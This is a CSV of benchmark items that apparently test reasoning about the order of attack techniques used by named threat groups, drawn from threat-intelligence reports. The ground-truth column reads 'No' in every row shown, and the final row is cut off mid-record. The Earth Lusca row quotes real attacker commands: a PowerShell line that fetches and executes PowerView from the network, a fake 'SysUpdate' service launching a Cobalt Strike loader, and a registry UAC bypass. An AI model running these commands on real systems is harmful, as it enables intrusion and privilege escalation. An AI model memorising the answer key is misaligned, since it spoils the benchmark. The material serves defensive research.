Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth
123,25,25-Persistence-T1547-Boot or Logon Autostart Execution,"After the malicious macro executed from the MS Office documents and successfully downloaded the RMS tool and supporting scripts, is it likely that the threat actors will attempt to kill the 'rundll32.exe' process before achieving persistence by adding a 'Microtik' string value to the registry and launching the RMS executable?","Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.","Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",No
830,211,869-Defense Evasion-T1610-Deploy Container,"Before GreyEnergy employs stealth techniques like partial AES-256 encryption of modules for defense evasion, is it likely that they will deploy a container to execute a command to create a reverse shell on the node?","Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.
Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",No
92,15,393-Collection-T1115-Clipboard Data,"After obtaining information such as the local IP address and system time through discovery, is Vyveva's backdoor likely to steal data from the victim's clipboard before compressing collected files and sending them to the C&C server?","Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",No
1395,337,337-Collection-T1074-Data Staged,"After collecting data from network shared drives and staging the data either locally or remotely for eventual fraudulent transactions, is FIN13 likely to leverage WMI to remotely execute commands and move laterally within victim networks?","Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",No
815,209,209-Command and Control-T1573-Encrypted Channel,"After communicating with C2 servers using an AES key encrypted with RSA as part of its command and control activities, is it likely that WinDealer will process and encrypt stolen data as "".a"" files in the %TEMP% directory during the exfiltration phase?","Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",No
1707,407,407-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that Black Energy 2 will allocate memory in the svchost.exe process and launch the injected library’s code using APC queue processing for persistence before evading defenses by encrypting its payload and loading plugins directly onto the infected machine?,"Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",No
353,88,88-Command and Control-T1132-Data Encoding,"After the downloader retrieves an image file containing encoded Asruex malware during the command and control phase, is it likely that PowerShell scripts will then download a Windows executable and a decoy document during the execution phase?","Command and Control: The downloader retrieves an image file containing encoded Asruex malware, which is then decoded and executed. Asruex communicates with a C&C server over HTTP and executes commands received. It operates based on configuration information stored within, including C&C servers, dummy hosts, version information, and a key for decoding data.","Initial Access: JPCERT/CC has been tracking malicious shortcut files sent as email attachments targeting specific organizations since around October 2015. These shortcut files, when opened, infect the host with Asruex malware, which has remote control capabilities. The attackers, associated with the group 'DarkHotel', use this method to attempt network intrusion.
Execution: Upon opening the malicious shortcut file, a PowerShell command is executed to download a batch file from a URL, which then executes PowerShell scripts to download a Windows executable (downloader) and a decoy document. The decoy documents are in Japanese and Chinese, indicating a broader target range.
Defense Evasion: Asruex malware has anti-analysis features, including the ability to detect virtual machines and stop running if such an environment is detected. It also has the capability to detect anti-virus software.
Others: Asruex is a relatively new malware observed since October 2015, likely to be used in continued targeted attacks. The malware downloads and executes AdvProv.dll, a plug-in that expands Asruex's functions, including file manipulation and registry operations. Hash values of artifacts and destination URLs used by Asruex are provided for security measures.",No
83,15,15-Exfiltration-T1041-Exfiltration Over C2 Channel,"After exfiltrating data to its C&C server over the communication channel via Tor as part of the Exfiltration tactic, is it likely that Vyveva will compress files with zlib for collection during the Collection tactic?",Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).,"Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",No
1606,381,2248-Credential Access-T1056-Input Capture,"After gaining initial access through malicious LNK files and delivering payloads via a convoluted infection chain, is SideCopy likely to capture mouse movements or perform API hooking before deploying njRAT malware for credential harvesting?","Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",No
9,3,3-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After APT42 performs credential harvesting through social engineering efforts, is it likely they will conduct reconnaissance to identify targets through spear-phishing and surveillance operations only after utilizing virtualization or sandbox evasion techniques for defense evasion?","Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",No
117,22,22-Initial Access-T1190-Exploit Public-Facing Application,"After exploiting CVE-2017-9841 to gain initial access on unpatched PHPUnit systems, is it likely that the Tuyul malware will periodically download a bash script named 'cron' to maintain persistence before executing Perl scripts and shell commands on victim systems?","Initial Access: On January 15, 2020, F5 threat researchers detected a new campaign exploiting a vulnerability in PHPUnit systems (CVE-2017-9841) to install an IRC bot named Tuyul. The malware specifically targets unpatched PHPUnit, a PHP unit testing framework, allowing the attacker to inject arbitrary PHP code on the server.","Execution: The Tuyul botnet, written in Perl, is used to execute commands on victim systems. The malware source code includes functionalities such as promoting bots to higher privilege (pro), demoting bots (noob), updating malware, connecting to reverse shells (bc), executing shell commands (shell), running Perl scripts (perl), and terminating the bot's connection (terminate, suicide).
Persistence: To maintain persistence, the Tuyul malware periodically downloads a bash script named 'cron' to ensure its continued presence on the system. It also includes functionality to detect and terminate processes from other malware infections.
Defense Evasion: The Tuyul malware employs a binary version that goes undetected by antivirus engines, allowing it to operate on the machine without signature-based detection. Additionally, the malware uses various PHP web shells to gain access to servers, including an open-source application called Tiny File Manager and an unknown advanced web shell.
Command and Control: The Tuyul botnet uses the domain irc[.]localroot[.]xyz as its command and control (C&C) server, which hosts the malware files and has a valid SSL certificate. The attacker also maintains two development servers for script development and testing, and for logging successful infections. The C&C server and development servers are protected by Cloudflare.
Others: The Tuyul botnet has possible Indonesian attribution based on several clues, including the time zone set to Asia/Jakarta, the botnet name, admin nicknames, and repository server. The botnet's peak size was 366 victim systems, which is smaller compared to other botnets. The infected servers are primarily hosted on cloud services such as AWS, DigitalOcean, and Linode, with a significant number located in the U.S. and U.K. The botnet's name, Tuyul, refers to a figure in Southeast Asian folklore, particularly Indonesian, which is an undead infant invoked for theft and other crimes. The botnet is actively being worked on and is expected to grow.",No
1574,376,2202-Credential Access-T1056.001-Keylogging,"After scanning for machines in the target's network environment using tools like HUC Port Banner Scanner and fscan, is it likely that Earth Lusca will gather account credentials via a BlackEnergy keylogger plugin before exploiting remote services for lateral movement within the network?","Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",No
1216,302,1570-Collection-T1560.003-Archive via Custom Method,"After monitoring antimalware logs and the Windows process list using PowerStallion, is it likely that Turla will compress output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm before executing additional PowerShell scripts for collecting recent files from the local file system?","Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",No
166,34,1914-Lateral Movement-T1550-Use Alternate Authentication Material,"After conducting internal reconnaissance using common Windows tools and open-source pentesting tools for discovery, is APT10 likely to abuse a compromised AD FS server's SAML token for lateral movement instead of leveraging shared MSP infrastructure before staging exfiltration data in multi-part archives in the Recycle Bin using compression tools?",Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.,"Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
